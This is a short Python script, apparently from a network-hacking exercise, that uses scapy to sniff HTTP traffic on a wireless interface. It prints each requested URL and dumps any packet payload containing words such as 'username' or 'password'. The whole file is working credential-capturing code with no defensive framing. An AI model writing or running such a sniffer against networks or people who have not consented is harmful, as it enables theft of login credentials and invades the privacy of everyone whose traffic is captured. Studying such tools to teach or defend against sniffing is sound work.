#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_infos(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		user_keys = ["username", "UserName", "user", "login", "password", "pass"]

		for user_key in user_keys:
			if user_key in load:
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)

		print("[+] HTTP-Request >> " + url)

		login_info = get_login_infos(packet)

		if login_info:
			print("\n\n[+] Username/Password > " + login_info + "\n\n")


sniff("wlan0")
